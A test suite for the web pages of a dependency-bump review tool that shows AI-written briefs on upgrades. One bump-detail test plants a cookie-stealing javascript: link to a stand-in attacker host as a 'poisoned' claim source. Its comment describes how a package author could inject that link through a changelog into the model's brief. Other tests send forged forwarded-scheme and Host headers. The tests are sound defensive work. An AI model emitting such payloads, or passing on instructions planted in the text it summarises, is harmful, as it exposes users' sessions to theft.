import { rm, writeFile } from 'node:fs/promises';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import type { BriefContent } from '../core/brief.js';
import { LOCKFILE_POLICY, PER_RUN_BUDGETS, RUN_TIME_BUDGET_SECONDS } from '../core/policy.js';
import type { BumpRecord, WatchedRepository } from '../core/records.js';
import { bumpPath, projectPath } from '../core/routes.js';
import { PUBLISHED_RUBRIC, RUBRIC_VERSION } from '../core/rubric.js';
import {
  BRIEFS_IN_FLIGHT,
  BRIEF_MODEL,
  CLOUD_REGION,
  FREE_TIER_REQUESTS_PER_DAY,
  FREE_TIER_REQUESTS_PER_MINUTE,
} from '../core/stack.js';
import { MemoryStore } from '../io/memory-store.js';
import {
  actionRecord,
  bumpRecord,
  candidateBump,
  readyBrief,
  runRecord,
  scoreOf,
  summaryOf,
} from '../testkit/fixtures.js';
import { createApp } from './app.js';
import { RUN_NOW_COOLDOWN_MS } from './run-now.js';

const DEMO: WatchedRepository = {
  id: 'voyagi/demo-app',
  owner: 'voyagi',
  repo: 'demo-app',
  ref: 'main',
  demo: true,
};

const NOW = new Date('2026-08-21T09:00:00Z');
const RED = bumpRecord({
  action: actionRecord({ number: 41, url: 'https://github.com/x/y/issues/41' }),
});

function greenBump(): BumpRecord {
  const candidate = candidateBump({
    dependency: 'zod',
    currentVersion: '4.4.2',
    candidateVersion: '4.4.3',
    usage: 'unused',
    usageSites: [],
    release: { notes: 'Patch release.', notesSource: 'https://example.com', commitSubjects: [] },
  });
  const score = scoreOf(candidate);
  const bump = summaryOf(candidate, DEMO);
  return bumpRecord({
    key: bump.key,
    repositoryId: DEMO.id,
    dependency: bump.dependency,
    currentVersion: bump.currentVersion,
    candidateVersion: bump.candidateVersion,
    score,
    brief: readyBrief({ status: 'unavailable', content: null, reason: 'no Gemini API key' }),
    action: actionRecord({
      id: 'green-action',
      bumpKey: bump.key,
      bumpTitle: 'zod 4.4.2 to 4.4.3',
      repositoryId: DEMO.id,
      kind: 'pull-request',
      ruleId: 'GRN-PR-1',
      number: 33,
      url: 'https://github.com/x/y/pull/33',
      score: score.total,
      band: score.band,
    }),
  });
}

async function seeded(): Promise<MemoryStore> {
  const store = new MemoryStore();
  const green = greenBump();
  const red = { ...RED, repositoryId: DEMO.id };

  await store.putWatchedRepository(DEMO);
  await store.putProjectSummary({
    repository: DEMO,
    lastRunId: runRecord().id,
    lastRunAt: runRecord().startedAt,
    lastRunStatus: 'finished',
    counts: { green: 1, amber: 0, red: 1 },
    actions: 2,
    worstScore: red.score.total,
  });
  await store.saveRun(
    runRecord({
      repositories: [
        {
          repositoryId: DEMO.id,
          dependenciesConsidered: 2,
          counts: { green: 1, amber: 0, red: 1 },
          actions: 2,
          missing: [{ what: 'lockfile', why: 'not on the default branch' }],
          error: null,
        },
      ],
    }),
  );
  await store.saveBump(red);
  await store.saveBump(green);
  if (red.action) await store.appendAction({ ...red.action, repositoryId: DEMO.id });
  if (green.action) await store.appendAction(green.action);
  return store;
}

function app(store: MemoryStore, over: Parameters<typeof createApp>[0] = {}) {
  return createApp({ store, now: () => NOW, baseUrl: 'https://bumpwarden.example.run', ...over });
}

async function text(store: MemoryStore, path: string): Promise<string> {
  const response = await app(store).request(`http://local${path}`);
  expect(response.status).toBe(200);
  return response.text();
}

let store: MemoryStore;

beforeEach(async () => {
  store = await seeded();
});

describe('home', () => {
  it('lists every watched repository with its counts and its worst reading', async () => {
    const body = await text(store, '/');
    expect(body).toContain('demo-app');
    expect(body).toContain('2 bumps: 1 clear, 1 held');
    expect(body).toContain(`${RED.score.total}`);
  });

  it('names the next scheduled run rather than leaving a reader guessing', async () => {
    expect(await text(store, '/')).toContain('next run 18:00 UTC');
  });

  it('publishes the same factor count the rubric page does', async () => {
    expect(await text(store, '/')).toContain(`${PUBLISHED_RUBRIC.length} factors`);
  });

  it('explains itself rather than showing an empty table when nothing is watched', async () => {
    const body = await text(new MemoryStore(), '/');
    expect(body).toContain('No repository is being watched yet.');
  });
});

describe('the project queue', () => {
  it('shows the move, the reason, the action and the score for each bump', async () => {
    const body = await text(store, projectPath(DEMO.id));
    expect(body).toContain('4.18.2');
    expect(body).toContain('5.0.0');
    expect(body).toContain('Hold issue #41');
    expect(body).toContain('https://github.com/x/y/issues/41');
    expect(body).toContain('Pull request #33');
  });

  it('filters to one band and says so in the filter', async () => {
    const body = await text(store, `${projectPath(DEMO.id)}?verdict=green`);
    expect(body).toContain('zod');
    expect(body).not.toContain('Hold issue #41');
  });

  it('ignores a verdict nobody publishes rather than failing the page', async () => {
    const body = await text(store, `${projectPath(DEMO.id)}?verdict=purple`);
    expect(body).toContain('Hold issue #41');
  });

  it('offers a way back when a filter matches nothing', async () => {
    const body = await text(store, `${projectPath(DEMO.id)}?verdict=amber`);
    expect(body).toContain('No bump in that band.');
    expect(body).toContain('Show every bump');
  });

  it('shows what the run could not read instead of hiding the gap', async () => {
    expect(await text(store, projectPath(DEMO.id))).toContain('not on the default branch');
  });

  it('answers 404 for a repository nobody watches', async () => {
    const response = await app(store).request(`http://local${projectPath('someone/else')}`);
    expect(response.status).toBe(404);
  });
});

describe('the bump detail', () => {
  it('shows the arithmetic, the brief and the action log', async () => {
    const body = await text(store, bumpPath(DEMO.id, RED.key));
    expect(body).toContain('How 62 was reached');
    expect(body).toContain('Two removed methods are called in your routes');
    expect(body).toContain('RED-HOLD-1');
    expect(body).toContain('res.sendfile');
  });

  it('links every claim to the source that justifies it', async () => {
    expect(await text(store, bumpPath(DEMO.id, RED.key))).toContain(
      'https://expressjs.com/en/guide/migrating-5.html',
    );
  });

  /**
   * The claim source is the model's own words about release notes a package author wrote, so a
   * package author who wants a script on this page writes the instruction into a changelog and
   * waits. The claim is still shown, because hiding what the agent said would be worse; only its
   * link is refused.
   */
  it('prints a claim source that is not a web address without making it clickable', async () => {
    const poisoned = bumpRecord({
      key: 'voyagi/demo-app#lodash@5.0.0',
      repositoryId: DEMO.id,
      dependency: 'lodash',
      candidateVersion: '5.0.0',
      brief: readyBrief({
        content: {
          ...(readyBrief().content as BriefContent),
          breaksHere: [
            {
              path: 'src/index.ts',
              line: 3,
              symbol: 'merge',
              quote: 'merge was removed',
              source: 'javascript:fetch("https://evil.example.net?c="+document.cookie)',
              verified: true,
            },
          ],
        },
      }),
    });
    await store.saveBump(poisoned);

    const body = await text(store, bumpPath(DEMO.id, poisoned.key));
    expect(body).not.toContain('href="javascript:');
    expect(body).toContain('evil.example.net');
  });

  /**
   * whatChanged is the one field the brief lets run to several paragraphs, and HTML eats the blank
   * line between them, so two paragraphs arrive as one sentence unless the page splits them.
   */
  it('keeps the paragraphs of the explanation apart', async () => {
    const wordy = bumpRecord({
      key: 'voyagi/demo-app#glob@11.0.0',
      repositoryId: DEMO.id,
      dependency: 'glob',
      candidateVersion: '11.0.0',
      brief: readyBrief({
        content: {
          ...(readyBrief().content as BriefContent),
          whatChanged: 'The walker is async now.\n\nThe sync export was removed.',
        },
      }),
    });
    await store.saveBump(wordy);

    const body = await text(store, bumpPath(DEMO.id, wordy.key));
    expect(body).toContain('<p>The walker is async now.</p>');
    expect(body).toContain('<p>The sync export was removed.</p>');
  });

  it('says the brief is unavailable rather than inventing one', async () => {
    const green = greenBump();
    const body = await text(store, bumpPath(DEMO.id, green.key));
    expect(body).toContain('Brief unavailable');
    expect(body).toContain('no Gemini API key');
  });

  it('answers 404 for a bump that is not in the queue', async () => {
    const response = await app(store).request(`http://local${bumpPath(DEMO.id, 'nope@1.0.0')}`);
    expect(response.status).toBe(404);
  });
});

describe('the audit log', () => {
  it('carries the run boundaries as well as the actions', async () => {
    const body = await text(store, '/audit');
    expect(body).toContain('RUN-START');
    expect(body).toContain('RUN-END');
    expect(body).toContain('RED-HOLD-1');
  });

  it('says nothing has happened rather than showing an empty table', async () => {
    expect(await text(new MemoryStore(), '/audit')).toContain('Nothing has happened yet.');
  });
});

describe('the published policy', () => {
  it('prints every rubric row with the weight the scorer awards', async () => {
    const body = await text(store, '/rubric');
    for (const factor of PUBLISHED_RUBRIC) {
      expect(body).toContain(factor.description);
    }
    expect(body).toContain(`rubric v${RUBRIC_VERSION}`);
  });

  it('publishes the per-run action budget, because a carried bump looks like a missed one', async () => {
    const body = await text(store, '/rubric');
    expect(body).toContain(`At most ${PER_RUN_BUDGETS.actions} actions in a run`);
    expect(body).toContain(`at most ${PER_RUN_BUDGETS.briefs} briefs`);
    expect(body).toContain(`after ${RUN_TIME_BUDGET_SECONDS / 60} minutes`);
    expect(body).toContain('riskiest first');
  });

  it('publishes the model limits it paces against, since that is why a long run takes minutes', async () => {
    const body = await text(store, '/rubric');
    expect(body).toContain(`${FREE_TIER_REQUESTS_PER_MINUTE} requests a minute`);
    expect(body).toContain(`${FREE_TIER_REQUESTS_PER_DAY} a day`);
    expect(body).toContain(`${BRIEFS_IN_FLIGHT} at a time`);
    expect(body).toContain('a brief costs two');
  });

  it('publishes the lockfile limitation in the same words the pull request uses', async () => {
    expect(await text(store, '/rubric')).toContain(LOCKFILE_POLICY);
  });

  it('says out loud that nothing is ever merged', async () => {
    expect(await text(store, '/rubric')).toContain('bumpwarden never merges');
  });
});

describe('about', () => {
  it('names the model, the region and where the model branch stops', async () => {
    const body = await text(store, '/about');
    expect(body).toContain(BRIEF_MODEL);
    expect(body).toContain(CLOUD_REGION);
    expect(body).toContain('explanation only, no write tools');
  });
});

describe('every page', () => {
  const paths = ['/', '/audit', '/rubric', '/about'];

  it('ships a title, a description and a canonical url', async () => {
    for (const path of paths) {
      const body = await text(store, path);
      expect(body).toContain('<title>');
      expect(body).toContain('name="description"');
      expect(body).toContain(`https://bumpwarden.example.run${path}`);
    }
  });

  it('opens with a doctype, so no browser falls back to quirks mode', async () => {
    for (const path of paths) {
      expect((await text(store, path)).startsWith('<!doctype html>')).toBe(true);
    }
  });

  it('refuses to be cached, because a run finishing is the moment someone is watching', async () => {
    const response = await app(store).request('http://local/');
    expect(response.headers.get('cache-control')).toBe('no-store');
  });

  it('offers a skip link before anything else', async () => {
    expect(await text(store, '/')).toContain('Skip to the content');
  });

  it('names its own icon, so no browser asks for a favicon that is not there', async () => {
    expect(await text(store, '/')).toContain('rel="icon" href="/favicon.svg"');
    expect((await app(store).request('http://local/favicon.svg')).status).toBe(200);
  });
});

describe('what the crawlers read', () => {
  /**
   * The Sitemap directive is only valid as an absolute URL. A relative one parses as an error and
   * the sitemap is never fetched, which is invisible from inside the product.
   */
  it('writes robots.txt with an absolute sitemap url', async () => {
    const response = await app(store).request('http://local/robots.txt');
    const body = await response.text();

    expect(response.status).toBe(200);
    expect(body).toContain('User-agent: *');
    expect(body).toContain('Sitemap: https://bumpwarden.example.run/sitemap.xml');
    expect(body).not.toContain('Sitemap: /');
  });

  /**
   * The Sitemap line has to be absolute, so an instance with no configured base url has to read
   * the host from the request. That makes the scheme beside it caller-controlled as well, and a
   * proxy header naming any scheme it liked would publish a url nothing can fetch.
   */
  it('takes a forwarded scheme only when it is one this service is reached over', async () => {
    const bare = createApp({ store, baseUrl: null });

    const https = await bare.request('http://local/robots.txt', {
      headers: { 'x-forwarded-proto': 'https' },
    });
    expect(await https.text()).toContain('Sitemap: https://local/sitemap.xml');

    for (const forged of ['ftp', 'javascript', 'gopher', 'https evil']) {
      const response = await bare.request('http://local/robots.txt', {
        headers: { 'x-forwarded-proto': forged },
      });
      expect(await response.text(), forged).toContain('Sitemap: http://local/sitemap.xml');
    }
  });

  it('publishes the configured url rather than the requested host, whatever the Host says', async () => {
    const response = await app(store).request('http://local/sitemap.xml', {
      headers: { host: 'evil.example.net' },
    });
    const body = await response.text();
    expect(body).toContain('https://bumpwarden.example.run/');
    expect(body).not.toContain('evil.example.net');
  });

  it('falls back to the requested host when the service has no configured url', async () => {
    const bare = createApp({ store, baseUrl: null });
    const body = await (await bare.request('http://local/robots.txt')).text();

    expect(body).toContain('Sitemap: http://local/sitemap.xml');
  });

  it('never serves a dotfile out of the asset folder, even one that is really there', async () => {
    // Serving a folder is not a decision to publish everything anyone drops into it. The file is
    // created for real, because a 404 on a path that never existed proves nothing about the guard.
    const marker = 'public/fonts/.test-marker';
    await writeFile(marker, 'local only', 'utf8');
    try {
      const hidden = await app(store).request('http://local/fonts/.test-marker');
      const plain = await app(store).request('http://local/fonts/mona-sans-latin.woff2');
      expect(hidden.status).toBe(404);
      expect(plain.status).toBe(200);
    } finally {
      await rm(marker, { force: true });
    }
  });

  it('answers 404 with a page rather than a bare status', async () => {
    const response = await app(store).request('http://local/does-not-exist');
    expect(response.status).toBe(404);
    expect(await response.text()).toContain('There is nothing at that address.');
  });

  it('answers a broken store with a page, and keeps the reason off it', async () => {
    const broken = new MemoryStore();
    vi.spyOn(broken, 'listProjectSummaries').mockRejectedValue(
      new Error('firestore: PERMISSION_DENIED on project bumpwarden-prod'),
    );
    const written = vi.spyOn(process.stdout, 'write').mockImplementation(() => true);

    const response = await app(broken).request('http://local/');
    const body = await response.text();
    const logged = written.mock.calls.map(([line]) => String(line)).join('');
    written.mockRestore();

    expect(response.status).toBe(500);
    expect(body).toContain('This page could not be built.');
    expect(body).not.toContain('PERMISSION_DENIED');
    // The operator gets the reason, the visitor gets a sentence.
    expect(JSON.parse(logged)).toMatchObject({
      severity: 'ERROR',
      message: 'page failed',
      path: '/',
      error: { message: 'firestore: PERMISSION_DENIED on project bumpwarden-prod' },
    });
  });
});

describe('the sitemap', () => {
  it('lists the stable pages and every watched project against the configured origin', async () => {
    const response = await app(store).request('http://local/sitemap.xml');
    const body = await response.text();
    expect(response.headers.get('content-type')).toContain('application/xml');
    expect(body).toContain('https://bumpwarden.example.run/rubric');
    expect(body).toContain(`https://bumpwarden.example.run${projectPath(DEMO.id)}`);
  });
});

describe('Run now', () => {
  it('reports the state as JSON for the poll, with no cache', async () => {
    const response = await app(store).request(`http://local${projectPath(DEMO.id)}/run-status`);
    expect(response.status).toBe(200);
    expect(response.headers.get('cache-control')).toBe('no-store');
    expect(await response.json()).toMatchObject({ state: 'ready' });
  });

  it('starts a run scoped to the project and redirects a form back to it', async () => {
    const startRun = vi.fn(async () => runRecord());
    const response = await app(store, { startRun }).request(
      `http://local${projectPath(DEMO.id)}/run`,
      { method: 'POST' },
    );

    expect(startRun).toHaveBeenCalledWith({ trigger: 'manual', repositoryId: DEMO.id });
    expect(response.status).toBe(303);
    expect(response.headers.get('location')).toBe(projectPath(DEMO.id));
  });

  it('answers JSON when the page asks for it, so the poll can take over', async () => {
    const startRun = vi.fn(async () => runRecord());
    const response = await app(store, { startRun }).request(
      `http://local${projectPath(DEMO.id)}/run`,
      { method: 'POST', headers: { accept: 'application/json' } },
    );
    expect(response.status).toBe(200);
    expect(await response.json()).toMatchObject({ runId: runRecord().id });
  });

  it('refuses a second press inside the cooldown, with the wait on the response', async () => {
    await store.saveRun(
      runRecord({
        id: 'run-manual',
        trigger: 'manual',
        scope: DEMO.id,
        startedAt: '2026-08-21T08:56:00.000Z',
        finishedAt: '2026-08-21T08:58:00.000Z',
      }),
    );
    const startRun = vi.fn(async () => runRecord());
    const response = await app(store, { startRun }).request(
      `http://local${projectPath(DEMO.id)}/run`,
      { method: 'POST' },
    );

    expect(response.status).toBe(429);
    expect(Number(response.headers.get('retry-after'))).toBe(RUN_NOW_COOLDOWN_MS / 1000 - 120);
    expect(startRun).not.toHaveBeenCalled();
  });

  it('refuses while a run is already going', async () => {
    await store.saveRun(
      runRecord({ id: 'run-live', status: 'running', scope: null, finishedAt: null }),
    );
    const startRun = vi.fn(async () => runRecord());
    const response = await app(store, { startRun }).request(
      `http://local${projectPath(DEMO.id)}/run`,
      { method: 'POST' },
    );

    expect(response.status).toBe(409);
    expect(startRun).not.toHaveBeenCalled();
  });

  it('refuses on a project that is not the demo one', async () => {
    await store.putWatchedRepository({
      ...DEMO,
      id: 'voyagi/private',
      repo: 'private',
      demo: false,
    });
    const startRun = vi.fn(async () => runRecord());
    const response = await app(store, { startRun }).request(
      `http://local${projectPath('voyagi/private')}/run`,
      { method: 'POST' },
    );

    expect(response.status).toBe(403);
    expect(startRun).not.toHaveBeenCalled();
  });

  it('answers 503 rather than pretending when no run pipeline is wired', async () => {
    const response = await app(store).request(`http://local${projectPath(DEMO.id)}/run`, {
      method: 'POST',
    });
    expect(response.status).toBe(503);
  });

  /**
   * The refusal above is proven against a run already recorded as running. A press that arrives
   * while another is still between its own read and its claim gets past that check, and the
   * orchestrator refuses it instead. 409 rather than the 500 an unhandled throw would give.
   */
  it('answers 409 when the orchestrator refuses a second concurrent run', async () => {
    const startRun = vi.fn(async () => {
      const refused = new Error('a run is already going');
      refused.name = 'RunInProgressError';
      throw refused;
    });
    const response = await app(store, { startRun }).request(
      `http://local${projectPath(DEMO.id)}/run`,
      { method: 'POST', headers: { accept: 'application/json' } },
    );

    expect(response.status).toBe(409);
    expect(await response.json()).toMatchObject({ state: 'running' });
  });

  it('hides the control entirely on a project a visitor may not run', async () => {
    await store.putWatchedRepository({
      ...DEMO,
      id: 'voyagi/private',
      repo: 'private',
      demo: false,
    });
    const body = await text(store, projectPath('voyagi/private'));
    expect(body).not.toContain('Run now</button>');
  });
});
